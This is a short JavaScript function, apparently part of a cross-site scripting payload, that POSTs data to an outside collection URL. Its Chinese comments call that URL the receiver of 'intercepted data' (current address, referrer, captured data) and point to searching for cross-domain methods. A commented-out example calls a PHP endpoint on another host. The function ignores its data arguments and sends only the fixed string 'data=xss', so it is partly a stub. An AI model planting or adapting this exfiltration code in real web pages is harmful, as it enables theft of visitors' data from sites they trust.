function Send_Data(url,ref,datas) {
        var xmlhttp = false;
        //更高效地获取XMLhttp对象
        if(window.XMLHttpRequest) {
                xmlhttp = new XMLHttpRequest();
                if(xmlhttp.overrideMimeType) { xmlhttp.overrideMimeType('text/xml'); }
        } else if(window.ActiveXObject) {
                var xmlobj = ['Microsoft.XMLHTTP','MSXML.XMLHTTP','Msxml2.XMLHTTP.8.0','Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.3.0','Msxml2.XMLHTTP'];
                for(var i = 0;i < xmlobj.length;i++) { try { xmlhttp = new ActiveXObject(xmlobj[i]); } catch(e) {} }
        }
        if(!xmlhttp) { return false; }
        //接收截获数据地址(跨域方法百度找)
        var sjurl = url;
        //$_POST['url']-当前地址,$_POST['ref']-来路,$_POST['data']-截获的数据
        var sjpos = 'data=xss';
        //POST方法提交数据
        xmlhttp.open("POST", sjurl, true);
        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        xmlhttp.setRequestHeader("Content-length",sjpos.length);
        xmlhttp.setRequestHeader("Connection","close");
        xmlhttp.send(sjpos);
        return true;
}

//Send_Data('http://extensions.com/test5.php','1111111','aaaaaaaa')